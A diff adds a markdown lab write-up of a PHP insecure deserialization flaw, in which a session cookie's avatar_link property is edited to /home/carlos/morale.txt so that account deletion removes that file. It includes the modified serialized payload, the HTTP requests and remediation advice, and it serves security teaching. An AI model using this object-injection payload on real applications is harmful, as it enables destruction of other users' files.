@@ -1,0 +1,312 @@
+# PHP Deserialization - Arbitrary File Deletion via Object Injection
+
+## Executive Summary
+
+A PHP deserialization vulnerability was identified in the application's session management mechanism. The application stores a serialized PHP object inside a client-controlled cookie and later deserializes it without validating its integrity.
+
+By modifying the `avatar_link` property of the serialized object, it is possible to force the server to delete an arbitrary file instead of the authenticated user's avatar during the account deletion process.
+
+This allows an attacker to delete files accessible by the web server, resulting in arbitrary file deletion.
+
+---
+
+# Vulnerability Classification
+
+| Property | Value |
+|----------|------|
+| Category | Insecure Deserialization |
+| Language | PHP |
+| CWE | CWE-502 - Deserialization of Untrusted Data |
+| Related Weakness | CWE-73 - External Control of File Name or Path |
+| Impact | Arbitrary File Deletion |
+| Severity | High |
+
+---
+
+# Summary
+
+The application stores user information inside a serialized PHP object contained in the session cookie.
+
+One of the serialized properties, `avatar_link`, specifies the location of the user's avatar file.
+
+When the user deletes their account, the server deserializes the cookie and blindly passes the value of `avatar_link` to a file deletion function.
+
+Since the serialized object is entirely controlled by the client and lacks integrity protection, an attacker can modify the file path to point to any file on the server.
+
+---
+
+# Affected Component
+
+```
+Session Cookie
+```
+
+Serialized PHP Object
+
+---
+
+# Original Serialized Object
+
+```php
+O:4:"User":3:{
+    s:8:"username";
+    s:6:"wiener";
+    s:12:"access_token";
+    s:32:"juucjes95ndj8ppk9cqwis1btlpfvk58";
+    s:11:"avatar_link";
+    s:19:"users/wiener/avatar";
+}
+```
+
+---
+
+# Vulnerability Details
+
+The application stores the path to the user's avatar inside the serialized object.
+
+During account deletion, the server performs the following sequence:
+
+1. Receives the session cookie.
+2. Base64 decodes it.
+3. Executes `unserialize()`.
+4. Reads the `avatar_link` property.
+5. Deletes the referenced file.
+6. Deletes the user account.
+
+Because the serialized object is fully controlled by the client, the attacker can replace the avatar path with any file accessible to the application.
+
+---
+
+# Proof of Concept
+
+## Step 1
+
+Authenticate using valid credentials.
+
+Capture the request:
+
+```http
+GET /my-account HTTP/2
+```
+
+---
+
+## Step 2
+
+Open the session cookie using Burp Suite Inspector.
+
+Original object:
+
+```php
+O:4:"User":3:{
+    s:8:"username";
+    s:6:"wiener";
+    s:12:"access_token";
+    s:32:"juucjes95ndj8ppk9cqwis1btlpfvk58";
+    s:11:"avatar_link";
+    s:19:"users/wiener/avatar";
+}
+```
+
+---
+
+## Step 3
+
+Modify only the `avatar_link` property.
+
+Original:
+
+```php
+s:11:"avatar_link";s:19:"users/wiener/avatar";
+```
+
+Modified:
+
+```php
+s:11:"avatar_link";s:23:"/home/carlos/morale.txt";
+```
+
+Resulting serialized object:
+
+```php
+O:4:"User":3:{
+    s:8:"username";
+    s:6:"wiener";
+    s:12:"access_token";
+    s:32:"juucjes95ndj8ppk9cqwis1btlpfvk58";
+    s:11:"avatar_link";
+    s:23:"/home/carlos/morale.txt";
+}
+```
+
+---
+
+## Step 4
+
+Click **Apply changes** in Burp Inspector.
+
+Burp automatically:
+
+- serializes the object;
+- Base64 encodes it;
+- updates the session cookie.
+
+---
+
+## Step 5
+
+Change the request to:
+
+```http
+POST /my-account/delete HTTP/2
+```
+
+---
+
+## Step 6
+
+Send the request.
+
+The application deletes:
+
+- the authenticated user account;
+- the file referenced by the modified `avatar_link` property.
+
+Since the path now points to:
+
+```
+/home/carlos/morale.txt
+```
+
+Carlos's file is deleted, solving the lab.
+
+---
+
+# Why the Exploit Works
+
+The application trusts serialized objects received from the client.
+
+Instead of determining the avatar location on the server, it reads the `avatar_link` property directly from the deserialized object and passes it to a file deletion routine.
+
+An attacker can therefore replace the original avatar path with any filesystem path.
+
+When the account deletion feature executes, the server deletes the attacker-controlled file instead of the legitimate avatar.
+
+---
+
+# Root Cause
+
+The vulnerability exists because:
+
+- serialized objects are stored client-side;
+- object integrity is not protected;
+- user-controlled file paths are trusted;
+- file operations are performed directly using deserialized properties.
+
+---
+
+# Impact
+
+An attacker can:
+
+- delete arbitrary files;
+- destroy application resources;
+- delete other users' files;
+- cause denial of service;
+- potentially facilitate further attacks depending on the deleted file.
+
+---
+
+# Remediation
+
+## Never deserialize untrusted data
+
+Avoid using:
+
+```php
+unserialize($_COOKIE['session']);
+```
+
+with user-controlled input.
+
+---
+
+## Store session data server-side
+
+Cookies should only contain a random session identifier.
+
+Example:
+
+```
+session=9b5f18f3a0...
+```
+
+---
+
+## Never trust file paths supplied by the client
+
+The avatar location should be retrieved from a trusted server-side source such as a database.
+
+---
+
+## Restrict filesystem access
+
+Before deleting any file:
+
+- canonicalize the path;
+- verify that it belongs to the expected avatar directory;
+- reject any path outside the allowed location.
+
+---
+
+## Sign serialized objects
+
+If serialized objects must be stored client-side, protect them using an HMAC or digital signature.
+
+---
+
+# Attack Flow
+
+```text
+                Login
+                   │
+                   ▼
+      Server serializes User object
+                   │
+                   ▼
+      Session cookie sent to client
+                   │
+                   ▼
+      Attacker modifies avatar_link
+
+users/wiener/avatar
+            │
+            ▼
+/home/carlos/morale.txt
+
+                   │
+                   ▼
+     Server deserializes cookie
+                   │
+                   ▼
+ POST /my-account/delete
+                   │
+                   ▼
+unlink("/home/carlos/morale.txt")
+                   │
+                   ▼
+ Carlos's file is deleted
+                   │
+                   ▼
+      Lab successfully completed
+```
+
+---
+
+# Key Takeaways
+
+- Client-controlled serialized objects must never be trusted.
+- Deserialized properties should never be used directly in filesystem operations.
+- File paths should always be generated and validated server-side.
+- Insecure deserialization can lead to arbitrary file deletion, privilege escalation, or even remote code execution depending on the application's logic.
+```
